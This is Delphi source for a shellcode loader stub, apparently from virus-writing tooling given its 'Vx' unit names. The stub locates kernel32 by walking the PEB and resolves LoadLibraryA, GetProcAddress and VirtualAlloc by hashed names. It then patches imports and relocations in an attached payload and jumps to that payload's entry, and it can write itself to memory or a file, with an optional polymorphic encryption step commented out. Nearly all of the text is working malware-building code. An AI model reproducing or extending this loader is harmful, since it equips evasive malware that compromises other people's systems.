{
apiname|hash|offset|apiname|hash|offset|0x00|
rva,offset,rva,offset,0xFFFFFFFF,Entry Offset

//need function
loadlibrary
getprocaddress
virtualalloc}

unit uFixCode;

interface
uses
  Winapi.Windows, VxWindows, VxSystem, Bpe32b;

type
  PFixReloc = ^TFixReloc;
  TFixReloc = packed record
    Rva: UInt32;
    Offset: UInt32;
  end;

function SaveFixCodeToMem(lpMem: Pointer): UInt32;
function SaveFixCodeToFile(szFileName: string): UInt32;

procedure FixCodeBegin(); stdcall;
function FixCodeEntry(): Pointer; stdcall;
procedure FixCodeEnd(); stdcall;
implementation

procedure FixCodeBegin(); assembler;
asm
  pushad
  call FixCodeEntry
  mov [esp + 7 * 4], eax
  popad
  jmp eax
end;

{$INCLUDE VxShellCode.inc}
function FixCodeEntry(): Pointer; stdcall;
label
__NEXT_API;
var
  hKernel32, hDll: HMODULE;
  xLoadLibraryA: TLoadLibraryA;
  xGetProcAddress: TGetProcAddress;
  xVirtualAlloc: TVirtualAlloc;
  lpSeek: Pointer;
  Api: Pointer;
  lpReloc: PFixReloc;
  Entry: UInt32;
  lpShellData: Pointer;
  ShellDataSize: UInt32;
begin
  lpShellData := _GetFixAddress(@FixCodeEnd);
  if (PUInt32(lpShellData)^ <> $00000000) then
  begin
    Result := Pointer(PUInt32(lpShellData)^);
    Exit;
  end;
  // get all need api
  hKernel32 := _GetKernelBase_PEB();
  @xGetProcAddress := _GetProcAddress_FromHash($F2509B84, nil, hKernel32);
  @xLoadLibraryA := _GetProcAddress_FromHash($A412FD89, @xGetProcAddress, hKernel32);
  @xVirtualAlloc := _GetProcAddress_FromHash($AB16D0AE, @xGetProcAddress, hKernel32);
  // fix
  lpSeek := Pointer(UInt32(lpShellData) + PUInt32(UInt32(lpShellData) + 4)^);
  while (True) do
  begin
    if (PUInt32(lpSeek)^ = $4D3C2B1A) then Break;
    hDll := xLoadLibraryA(PAnsiChar(lpSeek));
    while (PUInt8(lpSeek)^ <> $00) do Inc(PUInt8(lpSeek));
    Inc(PUInt8(lpSeek));
    while (PUInt32(lpSeek)^ <> $1A2B3C4D) do
    begin
      Api := _GetProcAddress_FromHash(PUInt32(lpSeek)^, @xGetProcAddress, hDll);
      Inc(PUInt32(lpSeek));
      PUInt32(UInt32(lpShellData) + PUInt32(lpSeek)^)^ := UInt32(Api);
      Inc(PUInt32(lpSeek));
    end;
    Inc(PUInt32(lpSeek));
  end;
  Inc(PUInt32(lpSeek));
  // fix reloc
  lpReloc := PFixReloc(lpSeek);
  while (lpReloc^.Rva <> $FFFFFFFF) do
  begin
    PUInt32(UInt32(lpShellData) + lpReloc^.Rva)^ := UInt32(lpShellData) + lpReloc^.Offset;
    Inc(lpReloc);
  end;
  // return entry
  Entry := lpReloc^.Offset + UInt32(lpShellData);
  PUInt32(lpShellData)^ := Entry;
  Result := Pointer(Entry);
end;

procedure FixCodeEnd(); stdcall; begin end;

function SaveFixCodeToFile(szFileName: string): UInt32;
var
  lpBuffer: Pointer;
  CodeSize: UInt32;
begin
  Result := 0;
  CodeSize := UInt32(@FixCodeEnd) - UInt32(@FixCodeBegin);
  lpBuffer := VX_MemAlloc(CodeSize);
  if (lpBuffer = nil) then Exit;
  VX_ZeroMem(lpBuffer, CodeSize);
  SaveFixCodeToMem(lpBuffer);
  if (VX_WriteDataToFile(PChar(szFileName), lpBuffer, CodeSize, False)) then
  begin
    Result := CodeSize;
  end;
  VX_MemFree(lpBuffer);
end;

function SaveFixCodeToMem(lpMem: Pointer): UInt32;
var
  Code: Pointer;
  CodeSize: UInt32;
  lpPolyBuffer: Pointer;
  dwMaxSize, dwPloySize: UInt32;
begin
  Result := 0;
  Code := Pointer(@FixCodeBegin);
  CodeSize := UInt32(@FixCodeEnd) - UInt32(@FixCodeBegin);
  //dwMaxSize := _GetBpe32MaxCryptSize(CodeSize);
  //if (IsBadWritePtr(lpMem, dwMaxSize)) then Exit;
  //dwPloySize := _Bpe32_Engine(lpMem, Code, CodeSize);
  //Result := dwPloySize;
  if (IsBadWritePtr(lpMem, CodeSize)) then Exit;
  CopyMemory(lpMem, Code, CodeSize);
  Result := CodeSize;
end;

end.
